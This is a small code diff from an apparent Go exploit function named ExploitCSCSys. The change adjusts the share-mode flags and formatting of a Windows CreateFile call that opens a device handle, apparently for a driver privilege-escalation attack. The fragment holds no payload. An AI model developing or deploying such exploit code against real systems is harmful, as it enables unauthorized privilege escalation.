@@ -150,9 +150,11 @@ func ExploitCSCSys() bool {
 	hDevice, _, _ := procCreateFile.Call(
 		uintptr(unsafe.Pointer(devName)),
 		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
-		0, 0,
+		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
+		0,
 		syscall.OPEN_EXISTING,
-		0, 0,
+		0,
+		0,
 	)
 
 	if hDevice == uintptr(syscall.InvalidHandle) {
